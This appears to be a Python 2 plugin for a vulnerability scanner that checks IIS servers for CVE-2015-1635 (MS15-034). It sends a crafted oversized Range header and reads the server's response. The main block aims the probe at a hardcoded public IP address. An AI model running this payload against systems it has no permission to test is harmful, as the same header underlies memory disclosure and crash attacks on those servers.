#!/usr/bin/env python
# encoding: utf-8

'''
Author : zyg
CreateTime: year-month-day
Description: 在2015年4月安全补丁日，微软发布的众多安全更新中，修复了HTTP.sys中一处允许远程执行代码漏洞，编号为：CVE-2015-1635（MS15-034 ）。
利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。根据公告显示，该漏洞对
服务器系统造成了不小的影响，主要影响了包括Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2在内的主流服务器操作系统。
'''

from ..t import T
import re
import urllib2,requests,urllib2,json,urlparse


class P(T):
    def __init__(self):
        T.__init__(self)

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        timeout=3
        if int(port) == 443:
            protocal = "https"
        else:
            protocal = "http"
        target_url = protocal + "://"+ip+":"+str(port)

        result = {}
        result['result']=False
        r=None
        vuln_header = {
                     'Range':"bytes=0-18446744073709551615",
                     'User-agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
                     'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                     'Cache-control': "no-cache",
                     'Connection': "close",
                      }
        try:
            r = requests.get(url=target_url,headers=vuln_header,timeout=timeout,verify=False,allow_redirects=False)
            #print r.content
            if "请求范围不符合" in r.content or "Requested Range Not Satisfiable" in r.content:
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type'] = 'Remote Code Execution Vul.'
                result['VerifyInfo']['URL'] = target_url
                result['VerifyInfo']['payload'] = "CVE-2015-1635 HTTP.SYS远程代码执行漏洞（ms15-034）"
                result['VerifyInfo']['level'] = '高危(HOLE)'
                result['VerifyInfo']['hole_id'] = 'CVE-2015-1635'
                result['VerifyInfo']['result'] = r.content
        except Exception,e:
            print e.text
        finally:
            if r is not None:
                r.close()
                del r
            return result



if __name__ == '__main__':
    print P().verify(ip='202.85.212.101',port='443')
